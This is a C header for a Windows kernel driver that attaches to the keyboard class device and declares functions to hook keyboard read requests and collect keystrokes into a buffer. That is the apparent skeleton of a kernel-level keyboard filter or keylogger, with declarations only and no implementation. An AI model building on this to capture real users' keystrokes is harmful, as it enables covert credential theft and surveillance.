#ifndef _KEYBOARD_H_
#define _KEYBOARD_H_

#include "inc.h"

#define ATTACHED_DEVICE_NAME    L"\\Device\\KeyboardClass0"

PDEVICE_OBJECT glAttachedDevice;
PFILE_OBJECT glAttachedFile;

ULONG glProcessingIrpCount;

typedef struct _TASK_KEYBOARD {
	ULONG posion;
	PCHAR buffer;
}TASK_KEYBOARD, *PTASK_KEYBOARD;
TASK_KEYBOARD glTaskKeyboard;

NTSTATUS InitHookKeyboard(PDRIVER_OBJECT pDriverObject);
NTSTATUS DispatchRoutine(IN PDEVICE_OBJECT ppDeviceObject, IN PIRP pIrp);
NTSTATUS ReadCompleteRoutine(PDEVICE_OBJECT ppDeviceObject, PIRP Irp, PVOID Context);

VOID TaskKeyboard(PCHAR buffer, ULONG size);

void WaitNullingVar(unsigned int* var);
void Sleep(LONGLONG count);
VOID UnhookKeyboard(PDRIVER_OBJECT pDriverObject);

#endif // _KEYBOARD_H_
